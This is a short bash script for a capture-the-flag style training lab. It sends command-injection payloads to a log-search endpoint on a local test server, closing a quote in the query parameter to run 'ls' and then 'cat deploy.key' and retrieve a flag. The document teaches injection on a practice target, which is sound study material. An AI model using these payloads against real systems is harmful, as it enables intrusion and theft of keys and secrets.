#!/usr/bin/env bash
# Lab 16 — the quote is not a wall. Close it, run a command, reopen it.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9160}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab16

open_lab "$SESSION" "$URL/api/logs/search?q=ERROR"

# 1. What is next to the log file?
send "$SESSION" "$REQ0" --set "query.q=zz'; ls; echo '" | body >&2; echo >&2

# 2. Read it.
send "$SESSION" "$REQ0" --set "query.q=zz'; cat deploy.key; echo '" | flag
